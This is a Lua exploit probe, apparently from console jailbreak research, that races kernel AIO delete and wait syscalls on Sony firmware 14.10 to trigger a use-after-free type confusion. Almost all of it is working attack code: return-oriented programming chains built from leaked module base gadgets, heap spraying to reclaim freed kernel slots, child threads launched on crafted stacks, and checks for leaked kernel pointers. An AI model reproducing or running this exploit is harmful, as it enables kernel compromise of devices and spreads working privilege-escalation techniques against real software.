-- CRASH_CLASS: HIGH
-- PROBE 557a: wait(663) as victim — 3-actor AIO type confusion
--
-- CRITICAL INSIGHT: 541d tested wait WITHOUT a deleter — spray went to
-- NEW slots, not originals'. The correct 3-actor model was never tested.
--
-- wait(663) has NO ID revalidation on 14.10 (Sony patched delete only).
-- AIO entries use a dedicated UMA zone (556a: knotes = different zone).
-- Only AIO entries reclaim freed AIO slots (540c: 64/64 swaps with AIO spray).
--
-- Model (per round):
-- 1. Submit 16 entries on /dev/urandom → complete fast
-- 2. Child A (DELETER): delete originals one-by-one (fast start)
-- 3. Main thread (SPRAYER): submit 64 new AIO entries → reclaim freed slots
-- 4. Child B (WAITER): wait(663) on original IDs, timeout={0,0} (delayed start)
--
-- Detection:
-- For entries where delete=0x00 (freed) AND wait!=0xDEADDEAD (sentinel):
--   → wait operated on a SPRAY entry = TYPE CONFUSION CONFIRMED
-- Post-race: poll spray entries for "consumed" state anomalies

print("=== PROBE 557a: WAIT VICTIM 3-ACTOR RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local Z = uint64(0)
local sc5   = mk(5)
local sc6   = mk(6)
local sc20  = mk(20)
local sc135 = mk(135)
local sc165 = mk(165)
local sc240 = mk(240)
local sc331 = mk(331)
local sc455 = mk(455)
local sc477 = mk(477)
local sc662 = mk(662)
local sc663 = mk(663)
local sc664 = mk(664)
local sc669 = mk(669)
local sc670 = mk(670)

local pid = N(sc20())
print("pid=" .. pid)

-- Module bases
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

-- Gadgets
local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

-- AIO init
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

-- Open /dev/urandom
local urand_path = memory.alloc(16)
for i = 1, 13 do
    local b = string.byte("/dev/urandom\0", i) or 0
    pcall(function() memory.write_byte(urand_path + (i - 1), b) end)
end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
write_string(urand_path, "/dev/urandom\0")
local ok_u, urand_fd = pcall(function() return sc5(uint64(N(urand_path)), Z, Z) end)
urand_fd = ok_u and N(urand_fd) or -1
print("urandom fd=" .. urand_fd)

-- AIO helpers
local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit(fd)
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(N(db)))
    wq(reqs_buf + 0x18, uint64(N(rb)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(N(reqs_buf)), uint64(1), uint64(1), uint64(N(ids_out)))
    end)
    return (ok and N(rv) or -999), (rd(ids_out) or 0)
end

local function aio_poll(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(N(ip)), uint64(1), uint64(N(sp)))
    end)
    return (ok and N(rv) or -999), (rd(sp) or 0)
end

local function aio_delete(id)
    local ip = memory.alloc(4); wd(ip, id)
    local sp = memory.alloc(4); wd(sp, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(N(ip)), uint64(1), uint64(N(sp)))
    end)
    return (ok and N(rv) or -999), (rd(sp) or 0)
end

-- Fake TCB (persistent)
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Shared memory (persistent)
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sn = N(shared)
print("shared=" .. q(shared))

-- Layout:
-- +0x000: done_del (dword)
-- +0x004: done_wait (dword)
-- +0x010: del_status[16] (dword each) — deleter writes here
-- +0x060: wait_status[16] (dword each) — waiter writes here
-- +0x0B0: ids[16] (dword each) — original AIO IDs
-- +0x100: rbuf_del (1 byte)
-- +0x104: rbuf_wait (1 byte)
-- +0x200: timeout — {tv_sec=0, tv_nsec=0} (16 bytes)

local done_del  = sn + 0x000
local done_wait = sn + 0x004
local del_stat  = sn + 0x010
local wait_stat = sn + 0x060
local ids_base  = sn + 0x0B0
local rbuf_del  = sn + 0x100
local rbuf_wait = sn + 0x104
local timeout   = sn + 0x200
wq(uint64(timeout), Z)
wq(uint64(timeout + 8), Z)

-- Stacks (persistent, reused across rounds)
local ok_sa, stack_A = pcall(function()
    return sc477(Z, uint64(0x400000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local ok_sb, stack_B = pcall(function()
    return sc477(Z, uint64(0x400000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_A = N(stack_A) + 0x200000 - 8
local rsp_B = N(stack_B) + 0x200000 - 8

-- thr_params (persistent)
local tp_A = memory.alloc(0x40); zero(tp_A, 0x40)
wq(tp_A, bare_ret)
wq(tp_A + 0x10, stack_A)
wq(tp_A + 0x18, uint64(0x200008))

local tp_B = memory.alloc(0x40); zero(tp_B, 0x40)
wq(tp_B, bare_ret)
wq(tp_B + 0x10, stack_B)
wq(tp_B + 0x18, uint64(0x200008))

-- Build deleter chain on stack_A
local function build_deleter(bar_fd, count)
    local pos = 0
    local function emit(v) wq(uint64(rsp_A + pos), v); pos = pos + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- read(barrier_fd, rbuf, 1)
    emit(pop_rdi); emit(uint64(bar_fd))
    emit(pop_rsi); emit(uint64(rbuf_del))
    emit(pop_rdx); emit(uint64(1))
    emit(pop_rax); emit(uint64(3))
    emit(fn_addr)

    -- 3 NOP startup (fast)
    for p = 1, 3 do
        emit(pop_rax); emit(uint64(20))
        emit(pop_rdi); emit(Z)
        emit(fn_addr)
    end

    -- delete each ID one by one
    for i = 0, count - 1 do
        emit(pop_rdi); emit(uint64(ids_base + i * 4))
        emit(pop_rsi); emit(uint64(1))
        emit(pop_rdx); emit(uint64(del_stat + i * 4))
        emit(pop_rax); emit(uint64(662))
        emit(fn_addr)

        -- 2 NOP between deletes
        for p = 1, 2 do
            emit(pop_rax); emit(uint64(20))
            emit(pop_rdi); emit(Z)
            emit(fn_addr)
        end
    end

    -- done marker
    emit(pop_rax); emit(uint64(0xDE1E))
    emit(pop_rdi); emit(uint64(done_del))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)
    return pos
end

-- Build waiter chain on stack_B
local function build_waiter(bar_fd, count)
    local pos = 0
    local function emit(v) wq(uint64(rsp_B + pos), v); pos = pos + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- read(barrier_fd, rbuf, 1)
    emit(pop_rdi); emit(uint64(bar_fd))
    emit(pop_rsi); emit(uint64(rbuf_wait))
    emit(pop_rdx); emit(uint64(1))
    emit(pop_rax); emit(uint64(3))
    emit(fn_addr)

    -- 40 NOP startup (DELAYED — let delete+spray happen first)
    for p = 1, 40 do
        emit(pop_rax); emit(uint64(20))
        emit(pop_rdi); emit(Z)
        emit(fn_addr)
    end

    -- wait each ID one by one: wait(663)(ids_ptr, 1, out_ptr, timeout_ptr)
    for i = 0, count - 1 do
        emit(pop_rdi); emit(uint64(ids_base + i * 4))
        emit(pop_rsi); emit(uint64(1))
        emit(pop_rdx); emit(uint64(wait_stat + i * 4))
        emit(pop_rcx); emit(uint64(timeout))
        emit(pop_rax); emit(uint64(663))
        emit(fn_addr)
    end

    -- done marker
    emit(pop_rax); emit(uint64(0xCA11))
    emit(pop_rdi); emit(uint64(done_wait))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)
    return pos
end

-- ============================================================
-- RACE LOOP
-- ============================================================
local ROUNDS   = 10
local NUM_IDS  = 16
local SPRAY_N  = 64
local SENTINEL = 0xDEADDEAD

local sv_buf = memory.alloc(16)
local ts     = memory.alloc(16)

local total_confusion = 0
local total_del_freed = 0
local total_wait_hit  = 0
local total_spray_sick = 0
local total_kptrs = 0

print(string.format("\nRacing %d rounds: %d originals, %d spray, 3-actor model\n", ROUNDS, NUM_IDS, SPRAY_N))

for round = 1, ROUNDS do
    -- 1. Submit originals on /dev/urandom
    local orig_ids = {}
    local ok_count = 0
    for i = 1, NUM_IDS do
        local rv, id = aio_submit(urand_fd)
        if rv == 0 and id > 0 then
            ok_count = ok_count + 1
            orig_ids[ok_count] = id
        end
    end

    if ok_count < 8 then
        print(string.format("R%d: only %d entries, skip", round, ok_count))
    else
        -- 2. Poll until all complete
        wq(uint64(N(ts)), Z); wq(uint64(N(ts) + 8), uint64(50000000))
        for try = 1, 20 do
            local all_done = true
            for i = 1, ok_count do
                local _, st = aio_poll(orig_ids[i])
                if st < 3 then all_done = false; break end
            end
            if all_done then break end
            pcall(function() sc240(uint64(N(ts)), Z) end)
        end

        -- 3. Write IDs + init sentinels
        zero(shared, 0x300)
        wq(uint64(timeout), Z)
        wq(uint64(timeout + 8), Z)
        for i = 1, ok_count do
            wd(ids_base + (i - 1) * 4, orig_ids[i])
            wd(del_stat + (i - 1) * 4, SENTINEL)
            wd(wait_stat + (i - 1) * 4, SENTINEL)
        end
        wd(done_del, 0)
        wd(done_wait, 0)

        -- 4. Create barrier socketpair
        local ok_b, rv_b = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv_buf)))
        end)
        local bar_rd = rd(sv_buf) or -1
        local bar_wr = rd(sv_buf + 4) or -1

        if bar_rd < 0 then
            print(string.format("R%d: barrier fail", round))
        else
            -- 5. Build chains
            build_deleter(bar_rd, ok_count)
            build_waiter(bar_rd, ok_count)

            -- 6. Launch children
            pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
            pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

            -- 7. Yield to let children block on barrier read
            for y = 1, 5 do pcall(function() sc331() end) end

            -- 8. Release barrier (close write end → EOF broadcast)
            pcall(function() sc6(uint64(bar_wr)) end)

            -- 9. SPRAY immediately — submit 64 new entries on /dev/urandom
            local spray_ids = {}
            local spray_n = 0
            for s = 1, SPRAY_N do
                local rv, id = aio_submit(urand_fd)
                if rv == 0 and id > 0 then
                    spray_n = spray_n + 1
                    spray_ids[spray_n] = id
                end
            end

            -- 10. Wait for both children (up to 5 seconds)
            wq(uint64(N(ts)), uint64(1)); wq(uint64(N(ts) + 8), Z)
            for w = 1, 10 do
                local dd = rd(done_del) or 0
                local dw = rd(done_wait) or 0
                if dd ~= 0 and dw ~= 0 then break end
                pcall(function() sc240(uint64(N(ts)), Z) end)
            end
            pcall(function() sc6(uint64(bar_rd)) end)

            local del_done  = (rd(done_del) or 0) == 0xDE1E
            local wait_done = (rd(done_wait) or 0) == 0xCA11

            -- 11. ANALYZE
            local freed = 0      -- delete returned 0x00
            local swapped = 0    -- delete returned 0x80020010
            local wait_hit = 0   -- wait returned something (not sentinel)
            local confusion = 0  -- freed AND wait_hit on SAME entry
            local kptrs = 0

            for i = 0, ok_count - 1 do
                local ds = rd(del_stat + i * 4) or SENTINEL
                local ws = rd(wait_stat + i * 4) or SENTINEL

                if ds == 0 then freed = freed + 1 end
                if ds == 0x80020010 then swapped = swapped + 1 end
                if ws ~= SENTINEL then wait_hit = wait_hit + 1 end
                if ds == 0 and ws ~= SENTINEL then
                    confusion = confusion + 1
                end

                -- kernel pointer check on wait output
                local h, l = 0, ws
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptrs = kptrs + 1
                end
            end

            -- 12. Spray health
            wq(uint64(N(ts)), Z); wq(uint64(N(ts) + 8), uint64(200000000))
            pcall(function() sc240(uint64(N(ts)), Z) end)

            local spray_ok = 0
            local spray_sick = 0
            local spray_states = {}
            for s = 1, spray_n do
                local _, st = aio_poll(spray_ids[s])
                local key = string.format("0x%X", st)
                spray_states[key] = (spray_states[key] or 0) + 1
                if st == 3 or st == 0x10003 then
                    spray_ok = spray_ok + 1
                else
                    spray_sick = spray_sick + 1
                end
            end

            -- Cleanup spray
            for s = 1, spray_n do
                pcall(function() aio_delete(spray_ids[s]) end)
            end
            -- Cleanup originals (best effort)
            for i = 1, ok_count do
                pcall(function() aio_delete(orig_ids[i]) end)
            end

            total_confusion = total_confusion + confusion
            total_del_freed = total_del_freed + freed
            total_wait_hit  = total_wait_hit + wait_hit
            total_spray_sick = total_spray_sick + spray_sick
            total_kptrs = total_kptrs + kptrs

            -- Report
            local tag = ""
            if confusion > 0 then tag = " *** TYPE CONFUSION ***" end
            if kptrs > 0 then tag = tag .. " *** KPTR ***" end
            if spray_sick > 0 then tag = tag .. " SPRAY_SICK" end
            if not del_done then tag = tag .. " DEL_TIMEOUT" end
            if not wait_done then tag = tag .. " WAIT_TIMEOUT" end

            print(string.format("R%d: del(freed=%d swap=%d) wait(hit=%d) confusion=%d spray(%d ok/%d sick) kptr=%d%s",
                round, freed, swapped, wait_hit, confusion, spray_ok, spray_sick, kptrs, tag))

            -- Detailed dump on first confusion or first round
            if round == 1 or confusion > 0 then
                local del_map = {}
                local wait_map = {}
                for i = 0, ok_count - 1 do
                    local ds = rd(del_stat + i * 4) or SENTINEL
                    local ws = rd(wait_stat + i * 4) or SENTINEL
                    local dk = string.format("0x%08X", ds)
                    local wk = string.format("0x%08X", ws)
                    del_map[dk] = (del_map[dk] or 0) + 1
                    wait_map[wk] = (wait_map[wk] or 0) + 1
                end
                local del_str = "  del_dist:"
                for k, v in pairs(del_map) do del_str = del_str .. " " .. k .. "x" .. v end
                local wait_str = "  wait_dist:"
                for k, v in pairs(wait_map) do wait_str = wait_str .. " " .. k .. "x" .. v end
                print(del_str)
                print(wait_str)
                if confusion > 0 then
                    print("  first confusion entries:")
                    local shown = 0
                    for i = 0, ok_count - 1 do
                        local ds = rd(del_stat + i * 4) or SENTINEL
                        local ws = rd(wait_stat + i * 4) or SENTINEL
                        if ds == 0 and ws ~= SENTINEL then
                            print(string.format("    [%d] del=0x%08X wait=0x%08X origID=0x%X",
                                i, ds, ws, rd(ids_base + i * 4) or 0))
                            shown = shown + 1
                            if shown >= 5 then break end
                        end
                    end
                end
                if spray_sick > 0 then
                    print("  spray_states:")
                    for k, v in pairs(spray_states) do print("    " .. k .. " x" .. v) end
                end
            end
        end
    end
end

-- ============================================================
-- Final health check
-- ============================================================
print("")
print("[HEALTH] post-race AIO check")
local h_rv, h_id = aio_submit(urand_fd)
if h_rv == 0 and h_id > 0 then
    wq(uint64(N(ts)), Z); wq(uint64(N(ts) + 8), uint64(200000000))
    pcall(function() sc240(uint64(N(ts)), Z) end)
    local h_prv, h_pst = aio_poll(h_id)
    local h_drv, h_dst = aio_delete(h_id)
    print(string.format("  create=0x%X poll=%d/0x%X del=%d/0x%X",
        h_id, h_prv, h_pst, h_drv, h_dst))
    if h_pst >= 3 and h_dst == 0 then
        print("  HEALTHY")
    else
        print("  *** UNHEALTHY ***")
    end
else
    print("  CREATE FAILED rv=" .. h_rv)
end

-- Summary
print("")
local pid2 = N(sc20())
print(string.format("SUMMARY: %d rounds, confusion=%d, del_freed=%d, wait_hit=%d, spray_sick=%d, kptr=%d",
    ROUNDS, total_confusion, total_del_freed, total_wait_hit, total_spray_sick, total_kptrs))
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))

if total_confusion > 0 then
    print(">>> TYPE CONFUSION CONFIRMED: wait(663) operated on spray entries <<<")
    print(">>> wait(663) has NO revalidation — exploitable on 14.10 <<<")
elseif total_wait_hit > 0 and total_del_freed > 0 then
    print("wait returned values but no overlap with freed entries — timing issue, retry with adjusted delays")
elseif total_wait_hit == 0 then
    print("wait returned nothing (all sentinel) — either entries gone before wait, or wait returns error for missing IDs")
else
    print("no type confusion detected in these rounds")
end

print("=== 557a DONE ===")
